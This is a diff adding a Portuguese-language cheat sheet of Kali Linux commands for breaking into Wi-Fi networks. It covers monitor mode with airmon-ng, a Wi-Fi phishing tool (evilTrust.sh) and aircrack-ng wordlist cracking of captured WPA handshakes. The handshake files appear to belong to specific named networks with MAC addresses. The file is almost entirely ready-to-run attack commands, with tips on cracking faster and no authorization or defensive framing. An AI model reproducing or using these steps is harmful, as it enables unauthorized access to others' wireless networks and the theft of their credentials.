@@ -1,0 +1,60 @@
+instala pacotes
+pip ou apt
+
+desligar modo monitor wifite
+airmon-ng stop wlan0mon LIGAR airmon-ng start wlan0
+
+ver como ta o adaaptador wifi
+airmon-ng
+
+roda o wifi pishing 
+./evilTrust.sh -m terminal 
+
+
+COMANDO PARA TESTA HANDSHAKE ESPECIFICO E WORDLIST ESPECIFICA COM O AIRCRACK.NG
+aircrack-ng -w /media/sf_KALI-LIVE/8digitos.txt /home/kali/hs/handshake_VDSDPA0984_F2-5B-20-28-7A-36_2025-01-31T15-57-17.cap 
+
+
+
+COMO TESTA WODILIST COM HANDSHAKE NO KALI WLS COM WINDOWS QUE E MAIS RAPIDO DOQ NA VIRTUALBOX
+PRIMEIRO INSTALE AS COISAS NECESSARIA
+sudo apt update
+sudo apt upgrade -y
+sudo apt install aircrack-ng
+
+COMANDO
+aircrack-ng -w /mnt/d/KALI-LIVE/8digitos.txt /mnt/d/KALI-LIVE/HANDSHAKE/handshake_VDSDPA0984_F2-5B-20-28-7A-36_2025-01-31T15-57-17.cap
+
+
+
+COMO ACESSAS OS DISCO E PASTA DO WINDWOS PELO WSL DO KALI
+ Acessar o C: (ou outros drives)
+
+No terminal do Kali, use o seguinte caminho para acessar a unidade C: do Windows:
+
+cd /mnt/c/
+
+Da mesma forma, se você tiver outras unidades, como D: ou E:, você pode acessá-las assim:
+
+    Para a unidade D:
+
+cd /mnt/d/
+
+
+COMANDOS PARA PARAR TODOS OS PROCESSOS DO AIRMON-NG E DO WIFITE CASO O ADAPTADOR NAO ESTEJA FUNCIONANDO
+airmon-ng check kill
+wifite --kill    
+
+
+
+COMO USAR O AIRCRACK PARA CRACKEAR WIFI PELO PENDRIVE BOTAVEL PASTA QUE TEM NOME COM ESPA;O
+aircrack-ng -w /media/kali/Novo\ volume/KALI-LIVE/rockyouWPA.txt /home/kali/hs/handshake_NoConnection24G_90-FD-73-E8-6D-83_2025-02-04T00-03-09.cap
+
+
+
+SE POSSIVEL TESTE AS WODLIST COM OS HANDHSHAKE FORA DO VIRTUALBOX QUE DEIXA O PROCESSO MUITO MAIS RAPIDO EXEMPLO
+VOCE PODE TENTA QUEBRA O HANDSHAKE DEPOIS DE CAPTURADO FORA DA VIRTUALBOX USANDO O KALI WSL NO WINDOWS OU KALI EM DUALBOT NO PC OU KALI EM DUALBOOT NO PENDRIVE
+
+
+
+‼️‼️‼️👉 ATENÇAO NA HORA DE FAZER OS TESTE COM OS COMANDOS ACIMA LEMBRE DE RENOMEAR OU TROCA O NOME DOS CAMINHOS DAS PASTA DIRETORIO POIS ESSES CAMINHO ERA O DIRETORIO QUE EU USAVA NO MEU PC EM TESTE NO SEU PC CASO VOCE ARMAZENE AS COISAS EM LOCAIS DIFERENTE VAI SER OUTRO CAMINHO ENTAO TROQUE TODOS ESSES CAMINHO QUE TEM UMA BARRA 👉/
